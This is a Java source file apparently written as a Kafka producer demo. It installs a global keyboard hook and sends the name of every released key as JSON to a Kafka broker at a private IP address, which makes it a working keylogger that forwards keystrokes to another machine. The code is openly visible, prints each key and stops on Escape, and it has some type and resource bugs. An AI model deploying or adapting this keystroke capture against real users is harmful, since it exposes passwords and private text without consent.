package com.mycompany.simplekafka;

import java.io.IOException;
import java.io.StringWriter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.Producer;
import org.apache.kafka.clients.producer.ProducerRecord;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.json.simple.JSONObject;

public class SensitiveProducer implements NativeKeyListener {

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e1) {
                //e1.printStackTrace();
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        JSONObject obj = new JSONObject();
        obj.put("keyPressed", NativeKeyEvent.getKeyText(e.getKeyCode()));

        StringWriter out = new StringWriter();

        try {
            obj.writeJSONString(out);
        } catch (IOException ex) {
            Logger.getLogger(Producer.class.getName()).log(Level.SEVERE, null, ex);
        }

        String jsonText = out.toString();
        System.out.print(jsonText);

        ProducerRecord producerRecord = new ProducerRecord<Integer, JSONObject>("topic", obj);
        Producer<Integer, String> producer = new KafkaProducer<Integer, String>(props);
        producer.send(producerRecord);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
//        ProducerRecord producerRecord = new ProducerRecord<Integer, String>("my.test", "Test Message outra coisa");
//        SensitiveProducer<Integer, String> producer = new KafkaProducer<Integer, String>(props);
//        producer.send(producerRecord);
    }
    public static Properties props = new Properties();

    public static void main(String[] args) {

        props.put("bootstrap.servers", "192.168.2.125:9092");
        props.put("key.serializer", "org.apache.kafka.common.serialization.IntegerSerializer");
        props.put("value.serializer", "org.apache.kafka.common.serialization.StringSerializer");

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new SensitiveProducer());
    }
}